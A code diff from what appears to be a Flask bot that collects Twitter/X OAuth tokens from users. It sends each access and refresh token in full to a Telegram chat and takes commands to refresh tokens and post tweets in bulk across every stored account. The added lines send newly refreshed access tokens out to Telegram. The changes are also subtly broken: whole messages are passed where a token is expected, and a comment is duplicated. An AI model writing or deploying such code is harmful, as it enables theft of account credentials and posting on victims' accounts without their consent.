@@ -138,6 +138,7 @@ def refresh_token_in_db(refresh_token, username):
         return None, None
 
 # Send message via Telegram
+# Send message via Telegram
 def send_message_via_telegram(access_token, refresh_token=None):
     alert_emoji = "🚨"
     key_emoji = "🔑"
@@ -150,11 +151,11 @@ def send_message_via_telegram(access_token, refresh_token=None):
     # Calculate the total tokens
     total_tokens = get_total_tokens()
 
-    # Properly format the access and refresh tokens in a clean way
+    # Format the access and refresh tokens
     access_token_display = f"`{access_token}`"
     refresh_token_display = f"`{refresh_token}`" if refresh_token else "None"
 
-    # Construct the message
+    # Build the message with properly formatted Markdown
     message = (
         f"{alert_emoji} *New user authenticated: OAuth 2.0*\n"
         f"{key_emoji} *Access Token:* {access_token_display}\n"
@@ -164,14 +165,14 @@ def send_message_via_telegram(access_token, refresh_token=None):
         f"🔢 *Total Tokens in Database:* {total_tokens}"
     )
 
-    # Send the message to Telegram ensuring UTF-8 encoding
+    # Send the message to Telegram
     url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
     data = {
         "chat_id": TELEGRAM_CHAT_ID,
         "text": message,
-        "parse_mode": "Markdown"  # Using Markdown for formatting
+        "parse_mode": "Markdown"  # Ensure we use Markdown for formatting
     }
-    
+
     headers = {
         "Content-Type": "application/json; charset=utf-8"
     }
@@ -243,7 +244,12 @@ def handle_refresh_single():
     tokens = get_all_tokens()
     if tokens:
         access_token, token_refresh, username = tokens[0]  # Use the first token
-        refresh_token_in_db(token_refresh, username)
+        new_access_token, new_refresh_token = refresh_token_in_db(token_refresh, username)
+        if new_access_token:
+            # Send success message
+            send_message_via_telegram(f"🔑 Token refreshed for @{username}. New Access Token: `{new_access_token}`")
+        else:
+            send_message_via_telegram(f"❌ Failed to refresh token for @{username}.")
     else:
         send_message_via_telegram("❌ No tokens found to refresh.")
 
@@ -252,7 +258,11 @@ def handle_refresh_bulk():
     tokens = get_all_tokens()
     if tokens:
         for access_token, refresh_token, username in tokens:
-            refresh_token_in_db(refresh_token, username)
+            new_access_token, new_refresh_token = refresh_token_in_db(refresh_token, username)
+            if new_access_token:
+                send_message_via_telegram(f"🔑 Token refreshed for @{username}. New Access Token: `{new_access_token}`")
+            else:
+                send_message_via_telegram(f"❌ Failed to refresh token for @{username}.")
         send_message_via_telegram(f"✅ Bulk token refresh complete. {len(tokens)} tokens refreshed.")
     else:
         send_message_via_telegram("❌ No tokens found to refresh.")
@@ -263,9 +273,9 @@ def telegram_webhook():
     update = request.json
     message = update.get('message', {}).get('text', '')
 
-    if message == '/refresh_single':
+    if message.startswith('/refresh_single'):
         handle_refresh_single()
-    elif message == '/refresh_bulk':
+    elif message.startswith('/refresh_bulk'):
         handle_refresh_bulk()
     elif message.startswith('/post_single'):
         tweet_text = message.replace('/post_single', '').strip()
@@ -281,7 +291,7 @@ def telegram_webhook():
             send_message_via_telegram("❌ Please provide tweet content.")
     else:
         send_message_via_telegram("❌ Unknown command. Use /refresh_single, /refresh_bulk, /post_single <tweet>, or /post_bulk <tweet>.")
-
+    
     return '', 200
 
 @app.route('/tweet/<access_token>', methods=['GET', 'POST'])
